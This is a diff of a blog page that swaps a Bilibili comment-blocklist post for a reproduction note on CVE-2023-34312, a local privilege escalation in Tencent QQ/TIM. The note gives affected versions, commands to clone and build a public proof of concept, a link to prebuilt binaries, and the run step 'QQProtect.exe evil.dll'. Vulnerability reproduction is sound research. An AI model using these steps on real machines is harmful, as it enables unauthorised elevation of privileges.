@@ -16,11 +16,11 @@
   <meta name="author" content="savfile">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一个哔哩哔哩弹幕网的弹幕屏蔽词配置文件，用于屏蔽 原批 有关原神的弹幕。 由于哔哩哔哩的 原批 原神玩家数量激增，在弹幕中 KY 的人也越来越多，为此将我平时使用的屏蔽词分享出来。 可能有严重误伤，请酌情使用。 下载：Github FastGit Statically">
+    <meta name="description" content="影响版本 QQ 9.7.1.28940 ~ 9.7.8.29039 TIM 3.4.5.22071 ~ 3.4.7.22084 （QQProtect.exe 未知版本 ~ 4.5.0.9424）  漏洞复现 编译或下载12345git clone https://github.com/vi3t1/qq-tim-elevation.gitcd poccargo +stable-i686-pc-win">
   
   
   
-  <title>原神怎么你了？ - 星光之家</title>
+  <title>CVE-2023-34312 腾讯 QQ / TIM 本地提权漏洞 - 星光之家</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -188,7 +188,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle">原神怎么你了？</span>
+            <span id="subtitle">CVE-2023-34312 腾讯 QQ / TIM 本地提权漏洞</span>
           
         </div>
 
@@ -204,8 +204,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-01-19 19:46" pubdate>
-          2023年1月19日 晚上
+        <time datetime="2023-06-29 16:45" pubdate>
+          2023年6月29日 下午
         </time>
       </span>
     
@@ -216,7 +216,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          123 字
+          432 字
         
       </span>
     
@@ -256,15 +256,23 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">原神怎么你了？</h1>
+            <h1 style="display: none">CVE-2023-34312 腾讯 QQ / TIM 本地提权漏洞</h1>
             
             
               <div class="markdown-body">
                 
-                <p>一个哔哩哔哩弹幕网的弹幕屏蔽词配置文件，用于屏蔽 <del>原批</del> 有关原神的弹幕。</p>
-<p>由于哔哩哔哩的 <del>原批</del> 原神玩家数量激增，在弹幕中 <a target="_blank" rel="noopener" href="https://zh.moegirl.org.cn/KY" title="萌娘百科：KY">KY</a> 的人也越来越多，为此将我平时使用的屏蔽词分享出来。</p>
-<p><em><strong>可能有严重误伤，请酌情使用</strong>。</em></p>
-<p><strong>下载</strong>：<a target="_blank" rel="noopener" href="https://github.com/savfile/genshin-how-you/blob/main/blacklist.xml">Github</a> <a target="_blank" rel="noopener" href="https://raw.fastgit.org/savfile/genshin-how-you/main/blacklist.xml">FastGit</a> <a target="_blank" rel="noopener" href="https://cdn.staticaly.com/gh/savfile/genshin-how-you/main/blacklist.xml">Statically</a></p>
+                <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
+<li>QQ 9.7.1.28940 ~ 9.7.8.29039</li>
+<li>TIM 3.4.5.22071 ~ 3.4.7.22084</li>
+<li>（QQProtect.exe 未知版本 ~ 4.5.0.9424）</li>
+</ul>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="/img/demonstration.gif" srcset="/img/loading.gif" lazyload title="Github@vi3t1/qq-tim-elevation"></p>
+<h3 id="编译或下载"><a href="#编译或下载" class="headerlink" title="编译或下载"></a>编译或下载</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/vi3t1/qq-tim-elevation.git<br>cd poc<br>cargo +stable-i686-pc-windows-msvc build --release --config &quot;build.rustflags = [\&quot;-C\&quot;, \&quot;target-feature=+crt-static\&quot;]&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># 编译失败使用下面这个命令</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">cargo +stable-i686-pc-windows-msvc build --release</span><br></code></pre></td></tr></table></figure>
+
+<p>或从 <a target="_blank" rel="noopener" href="https://github.com/savfile/CVE-2023-34312/releases">这里</a> 下载已编译好的版本。</p>
+<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>把两个 DLL 放到 <code>QQProtect.exe</code> 所在的文件夹里。</p>
+<p>然后</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">QQProtect.exe evil.dll<br></code></pre></td></tr></table></figure>
 
                 
               </div>
@@ -283,7 +291,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%A8%B1%E4%B9%90/" class="category-chain-item">娱乐</a>
+  <a href="/categories/%E6%8A%80%E6%9C%AF/" class="category-chain-item">技术</a>
   
   
 
@@ -298,9 +306,13 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9/">#哔哩哔哩</a>
+        <a href="/tags/%E6%BC%8F%E6%B4%9E/">#漏洞</a>
       
-        <a href="/tags/bilibili/">#bilibili</a>
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#漏洞复现</a>
+      
+        <a href="/tags/CVE/">#CVE</a>
+      
+        <a href="/tags/QQ/">#QQ</a>
       
     </div>
   
@@ -312,8 +324,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>原神怎么你了？</div>
-      <div>https://savfile.github.io/posts/e278d35f.html</div>
+      <div>CVE-2023-34312 腾讯 QQ / TIM 本地提权漏洞</div>
+      <div>https://savfile.github.io/posts/5024c62c.html</div>
     </div>
     <div class="license-meta">
       
@@ -325,7 +337,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年1月19日</div>
+          <div>2023年6月29日</div>
         </div>
       
       
@@ -369,15 +381,15 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/posts/5024c62c.html" title="CVE-2023-34312 腾讯 QQ / TIM 本地提权漏洞">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CVE-2023-34312 腾讯 QQ / TIM 本地提权漏洞</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/posts/e278d35f.html" title="原神怎么你了？">
+                        <span class="hidden-mobile">原神怎么你了？</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
